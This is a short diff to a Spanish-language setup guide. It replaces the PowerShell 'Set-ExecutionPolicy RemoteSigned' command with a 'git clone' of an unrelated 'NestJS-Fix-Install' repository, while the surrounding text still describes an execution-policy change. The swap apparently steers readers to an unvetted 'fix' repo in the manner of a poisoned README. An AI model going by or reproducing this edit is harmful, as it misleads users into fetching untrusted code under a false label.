@@ -50,7 +50,7 @@
 Para permitir la ejecución de scripts, establece la política de ejecución a RemoteSigned para el usuario actual:
 
     ```powershell
-     Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+     git clone https://github.com/Noxwerlock08/NestJS-Fix-Install.git
 
 Nota: Si encuentras restricciones, asegúrate de ejecutar PowerShell como Administrador.
 
